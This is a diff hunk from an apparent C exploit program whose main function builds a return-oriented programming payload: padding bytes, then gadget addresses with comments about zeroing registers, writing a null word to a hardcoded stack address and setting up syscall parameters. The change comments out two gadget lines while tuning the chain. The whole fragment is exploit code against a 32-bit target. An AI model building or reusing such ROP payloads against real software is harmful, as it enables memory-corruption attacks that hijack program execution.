@@ -35,8 +35,8 @@ int main(void)
                       "\x68\x07\xAD\xBB"
                       "\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB"
                       "\xD4\xBE\xB3\xBB" // 0 out edx
-                      "\x22\xA4\xBA\xBB\xE4\x28\xBF\xBF" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
-                      "\x7E\xB8\xB6\xBB" // move edx (0 word to y array)
+                      //"\x22\xA4\xBA\xBB\xE4\x28\xBF\xBF" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
+                      //"\x7E\xB8\xB6\xBB" // move edx (0 word to y array)
                       "\x22\xA4\xBA\xBB\xF8\x28\xBF\xBF" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
                       "\x7E\xB8\xB6\xBB" // move edx (0 word to 3rd param passed to syscall)
                       //"\x62\x26\xB4\xBB" // skip over y array (inc esp by 8)
